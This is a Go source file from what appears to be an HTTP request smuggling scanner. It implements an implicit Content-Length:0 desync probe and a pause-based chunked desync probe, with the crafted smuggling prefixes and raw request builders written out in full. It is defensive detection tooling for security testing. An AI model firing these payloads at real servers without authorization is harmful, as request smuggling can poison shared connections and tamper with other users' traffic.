package scan

// ScanImplicitZero detects the "implicit Content-Length: 0" desync.
// (Mirrors ImplicitZeroScan.java)
//
// Some servers treat a GET/HEAD request with no body as if Content-Length
// were 0.  If a front-end adds a body to such a request, and the back-end
// uses the implicit CL=0, the injected body is treated as a new request.
//
// Detection:
//   1. Send GET + body (the injected prefix) with no CL header.
//   2. Immediately follow with a normal request on the same connection.
//   3. If the second response reflects content from the injected body
//      (e.g., a 404 for the injected path), the target is vulnerable.

import (
	"bytes"
	"fmt"
	"time"

	"smuggled.tool/pkg/transport"
)

var implicitZeroGadgets = []struct {
	name   string
	prefix string
}{
	{
		name:   "GPOST",
		prefix: "GPOST / HTTP/1.1\r\nFoo: x",
	},
	{
		name:   "method-injection",
		prefix: "GET /%s/ HTTP/1.1\r\nFoo: x",
	},
	{
		name:   "header-injection",
		prefix: "GET / HTTP/1.1\r\nX-Injected: yes\r\nFoo: x",
	},
}

// ScanImplicitZero probes for GET-with-body / implicit-CL=0 desync.
func ScanImplicitZero(t Target, baseReq []byte, opts Options) []Finding {
	var findings []Finding
	connCfg := t.Conn
	connCfg.Timeout = opts.Timeout
	connCfg.ProxyURL = opts.ProxyURL

	for _, gadget := range implicitZeroGadgets {
		prefix := fmt.Sprintf(gadget.prefix, t.Host)

		attack := buildImplicitZeroAttack(t, prefix)
		// Follow-up probes what ended up in the pipe
		probe := buildImplicitZeroProbe(t)

		if opts.Verbose {
			logf("  implicit-zero [%s] → %s", gadget.name, t.Host)
		}

		r1, r2 := transport.SendPair(connCfg, attack, probe)
		if r1.Error != nil || r2.Error != nil || r2.StatusCode == 0 {
			continue
		}

		// Signal: if r2 gets an unexpected status (e.g. 400/404/405) while
		// the clean baseline gives 200/30x, we may have poisoned the pipe.
		baseResp := transport.SendAndReceive(connCfg, probe)
		if baseResp.Error != nil || baseResp.StatusCode == 0 {
			continue
		}

		if r2.StatusCode == baseResp.StatusCode {
			continue // no difference
		}

		// Require the anomaly class to differ
		if statusClass(r2.StatusCode) == statusClass(baseResp.StatusCode) {
			continue
		}

		confirmed := confirm(opts.ConfirmRounds, func() bool {
			ar1, ar2 := transport.SendPair(connCfg, attack, probe)
			if ar1.Error != nil || ar2.StatusCode == 0 {
				return false
			}
			return statusClass(ar2.StatusCode) != statusClass(baseResp.StatusCode)
		})
		if !confirmed {
			continue
		}

		findings = append(findings, Finding{
			URL:       t.RawURL,
			Technique: "implicit-zero-" + gadget.name,
			Type:      "implicit-zero-CL",
			Severity:  SeverityProbable,
			Description: fmt.Sprintf(
				"Implicit Content-Length=0 desync via GET+body ('%s'). "+
					"Follow-up request received status %d instead of baseline %d. "+
					"The back-end may be interpreting the injected body as a new request.",
				gadget.name, r2.StatusCode, baseResp.StatusCode,
			),
			Evidence: fmt.Sprintf(
				"Attack r2 status: %d | Baseline status: %d\n\nAttack payload:\n%s",
				r2.StatusCode, baseResp.StatusCode,
				sanitiseForLog(attack, 512),
			),
			Timestamp: time.Now(),
		})

		if opts.Verbose {
			logf("  [!] Implicit-zero '%s' on %s (r2=%d, base=%d)",
				gadget.name, t.RawURL, r2.StatusCode, baseResp.StatusCode)
		}
	}

	return findings
}

func buildImplicitZeroAttack(t Target, prefix string) []byte {
	var b bytes.Buffer
	fmt.Fprintf(&b, "GET %s HTTP/1.1\r\n", t.Path)
	fmt.Fprintf(&b, "Host: %s\r\n", t.Host)
	b.WriteString("User-Agent: Mozilla/5.0\r\n")
	b.WriteString("Accept: */*\r\n")
	b.WriteString("Connection: keep-alive\r\n")
	// Deliberately NO Content-Length header — relying on implicit CL=0
	b.WriteString("\r\n")
	b.WriteString(prefix) // injected body
	return b.Bytes()
}

func buildImplicitZeroProbe(t Target) []byte {
	var b bytes.Buffer
	fmt.Fprintf(&b, "GET %s HTTP/1.1\r\n", t.Path)
	fmt.Fprintf(&b, "Host: %s\r\n", t.Host)
	b.WriteString("Connection: close\r\n")
	b.WriteString("\r\n")
	return b.Bytes()
}

// ─── Pause desync scan ────────────────────────────────────────────────────────

// ScanPauseDesync implements pause-based desync.
// (Mirrors PauseDesyncScan.java)
//
// Strategy: split a chunked request mid-body, introduce a pause between the
// two halves.  A vulnerable intermediary may forward the first half early and
// interpret subsequent bytes as a new request.
func ScanPauseDesync(t Target, baseReq []byte, opts Options) []Finding {
	var findings []Finding
	connCfg := t.Conn
	connCfg.Timeout = opts.Timeout
	connCfg.ProxyURL = opts.ProxyURL

	// Build the full chunked payload
	body := "x=y"
	fullChunk := fmt.Sprintf("POST %s HTTP/1.1\r\nHost: %s\r\nContent-Type: application/x-www-form-urlencoded\r\nTransfer-Encoding: chunked\r\nConnection: keep-alive\r\n\r\n%x\r\n%s\r\n0\r\n\r\n",
		t.Path, t.Host, len(body), body)

	// We pause after sending the headers + first chunk-size line
	headerEnd := bytes.Index([]byte(fullChunk), []byte("\r\n\r\n"))
	if headerEnd == -1 {
		return nil
	}
	pauseAt := headerEnd + 4 + len(fmt.Sprintf("%x\r\n", len(body)))

	pauseConnCfg := connCfg
	pauseConnCfg.SendDelay = 6 * time.Second
	pauseConnCfg.SendPauseAt = pauseAt

	if opts.Verbose {
		logf("  pause-desync probe → %s (pause at byte %d)", t.Host, pauseAt)
	}

	r := transport.SendAndReceive(pauseConnCfg, []byte(fullChunk))

	// A normal server waits patiently and responds after receiving the full body.
	// A vulnerable server may: (a) time out on the first half, (b) respond
	// prematurely.  We look for a response that arrived before the pause elapsed
	// — i.e., the server processed part of the request early.
	if r.Error != nil || r.StatusCode == 0 {
		return nil
	}

	// If response arrived significantly before our pause, the server processed
	// the partial request immediately — interesting signal.
	if r.Duration >= pauseConnCfg.SendDelay {
		return nil // server waited, no early response
	}

	// Confirm
	confirmed := confirm(opts.ConfirmRounds, func() bool {
		cr := transport.SendAndReceive(pauseConnCfg, []byte(fullChunk))
		return cr.StatusCode != 0 && cr.Duration < pauseConnCfg.SendDelay
	})
	if !confirmed {
		return nil
	}

	findings = append(findings, Finding{
		URL:       t.RawURL,
		Technique: "pause-desync",
		Type:      "pause-desync",
		Severity:  SeverityProbable,
		Description: "Pause-based desync: the server responded before the full " +
			"chunked body was delivered, suggesting the front-end forwarded the " +
			"partial request early. This is indicative of a timing-based desync " +
			"vulnerability.",
		Evidence: fmt.Sprintf(
			"Response arrived in %s (pause was %s), status %d.\n\nPayload:\n%s",
			r.Duration, pauseConnCfg.SendDelay,
			r.StatusCode,
			sanitiseForLog([]byte(fullChunk), 512),
		),
		Timestamp: time.Now(),
	})

	if opts.Verbose {
		logf("  [!] Pause desync on %s (responded in %s < pause %s)",
			t.RawURL, r.Duration, pauseConnCfg.SendDelay)
	}

	return findings
}
